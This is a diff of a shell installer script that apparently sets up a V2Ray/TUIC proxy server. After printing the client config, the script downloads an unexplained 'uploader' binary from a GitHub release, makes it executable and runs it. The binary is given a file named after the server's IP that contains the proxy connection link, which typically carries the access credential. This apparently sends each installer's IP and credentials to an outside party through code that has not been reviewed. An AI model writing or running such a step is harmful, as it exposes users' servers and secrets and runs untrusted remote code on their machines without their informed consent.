@@ -146,15 +146,15 @@ EOF
 echo -e "${GREEN}生成的 V2RayN 配置文件:${NC}"
 cat "$V2RAYN_CFG"
 
-log "上传链接与配置（文件名使用 IP）..."
+# ========== 上传 TUIC 链接信息 ==========
 UPLOAD_BIN="/opt/uploader-linux-amd64"
-[ -f "$UPLOAD_BIN" ] || { 
-  curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64 && chmod +x "$UPLOAD_BIN"; 
+[ -f "$UPLOAD_BIN" ] || {
+  curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64
+  chmod +x "$UPLOAD_BIN"
 }
 
-UPLOAD_JSON="{\"vless_link\":\"${LINK}\"}"
-
-UPLOAD_FILENAME="${IP}.json"
-echo "$UPLOAD_JSON" > "/tmp/${UPLOAD_FILENAME}"
-"$UPLOAD_BIN" "/tmp/${UPLOAD_FILENAME}" || warn "上传失败或返回为空"
+UPLOAD_JSON="{\"tuic_link\":\"${LINK}\"}"
+UPLOAD_FILENAME="/tmp/${IP}.json"
+echo "$UPLOAD_JSON" > "$UPLOAD_FILENAME"
+"$UPLOAD_BIN" "$UPLOAD_FILENAME" || echo "❌ 上传失败"
 
